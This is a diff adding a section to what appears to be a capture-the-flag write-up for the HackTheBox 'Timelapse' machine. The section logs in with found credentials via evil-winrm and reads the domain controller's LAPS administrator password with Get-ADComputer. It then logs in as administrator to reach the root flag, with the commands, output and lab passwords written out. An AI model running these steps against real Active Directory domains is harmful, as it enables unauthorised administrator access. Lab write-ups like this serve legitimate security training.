@@ -274,6 +274,62 @@ get-aduser -filter * -properties *
 exit
 ```
 
+We found a new set of credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`.
+
+
+## LAPS_Readers
+
+Signed in with `evil-winrm`:
+
+```bash
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
+
+Noted that the user `svc_deploy` is a member of the group `LAPS_Readers`, which indicates `svc_deploy` has access to read from LAPS. Local Administrator Password Solution (LAPS) is a tool used for managing a system where administrator passwords, which are unique, randomized, and frequently changed, are applied to domain-joined computers. In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: 
+`ms-mcs-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`. These attributes store the plain-text administrator password and its expiration time, respectively.
+
+Can check if service is enabled:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd
+    AdmPwdEnabled    REG_DWORD    0x1
+```
+
+To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd` property:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : #4{r284#V9#4+o5kIdJv}535
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+```
+
+Can see the password for the local admin and logged into to get the root flag:
+
+```bash
+evil-winrm -i 10.10.11.152 -u administrator -p '#4{r284#V9#4+o5kIdJv}535' -S
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> dir
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/15/2024  11:30 AM             34 root.txt
+```
 
 
 
